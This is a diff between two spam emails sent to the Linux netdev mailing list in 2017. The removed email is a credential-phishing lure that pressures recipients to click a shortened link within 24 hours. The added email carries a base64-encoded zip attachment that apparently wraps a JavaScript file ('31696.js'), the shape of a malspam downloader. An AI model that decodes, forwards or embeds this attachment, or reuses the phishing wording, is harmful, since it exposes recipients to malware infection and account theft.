@@ -1,32 +1,69 @@
-From: "IT Department" <"rambabu."@careind.net>
-Subject: Maintenance Notification
-Date: Fri, 19 May 2017 02:24:19 +0100
-Message-ID: <20170519011752.3C58F2865130@cams.careind.net>
+From: <openhackbangalore@gmail.com>
+Subject: (unknown)
+Date: Fri, 19 May 2017 03:34:21 -0000
+Message-ID: <149516486158.1559.17044427812604526986@vnpt.vn>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="iso-8859-1"
-Content-Transfer-Encoding: 8BIT
-To: netdev@vger.kernel.org
+Content-Type: application/zip; name="04104849287.zip"
+Content-Transfer-Encoding: base64
+To: <netdev@vger.kernel.org>
 Return-path: <netdev-owner@vger.kernel.org>
-Received: from cams.careind.net ([1.23.164.19]:42275 "EHLO cams.careind.net"
-        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-        id S932219AbdESDJq (ORCPT <rfc822;netdev@vger.kernel.org>);
-        Thu, 18 May 2017 23:09:46 -0400
-Received: from localhost (localhost.localdomain [127.0.0.1])
-        by cams.careind.net (Postfix) with ESMTP id 5EC4D2880E4A
-        for <netdev@vger.kernel.org>; Fri, 19 May 2017 07:06:22 +0530 (IST)
-Received: from cams.careind.net ([127.0.0.1])
-        by localhost (cams.careind.net [127.0.0.1]) (amavisd-new, port 10024)
-        with ESMTP id 7L4sZYGuhOZ2 for <netdev@vger.kernel.org>;
-        Fri, 19 May 2017 07:06:22 +0530 (IST)
-Received: from [192.168.10.101] (unknown [192.168.0.31])
-        by cams.careind.net (Postfix) with ESMTPSA id 3C58F2865130
-        for <netdev@vger.kernel.org>; Fri, 19 May 2017 06:47:51 +0530 (IST)
-Content-Description: Mail message body
+Received: from static.vnpt.vn ([14.177.204.254]:41181 "HELO vnpt.vn"
+        rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1751155AbdESDel (ORCPT <rfc822;netdev@vger.kernel.org>);
+        Thu, 18 May 2017 23:34:41 -0400
+Subject: 
+Content-Disposition: attachment
 Sender: netdev-owner@vger.kernel.org
 List-ID: <netdev.vger.kernel.org>
 
-Recently, we have detect some unusual activity on your account and as a result, all email users are urged to update their email account within 24 hours of receiving this e-mail, please click the link http://beam.to/7043 to confirm that your email account is up to date with the institution requirement.
-
----
-This email has been checked for viruses by Avast antivirus software.
-https://www.avast.com/antivirus
+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
